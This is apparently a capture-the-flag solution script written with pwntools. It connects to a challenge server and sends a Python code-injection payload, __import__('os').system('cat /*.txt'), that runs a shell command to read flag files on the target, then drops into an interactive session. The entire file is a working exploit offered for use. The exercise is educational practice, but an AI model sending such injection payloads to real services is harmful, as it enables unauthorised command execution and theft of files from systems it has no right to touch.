from pwn import *

conn = remote('chal.sigpwny.com', 5010)

conn.recvline()

# import os; os.system("cat /flag.txt") 
exploit = "__import__('os').system(\'cat /*.txt\')"

print(exploit)

conn.sendline(exploit.encode())
conn.interactive()


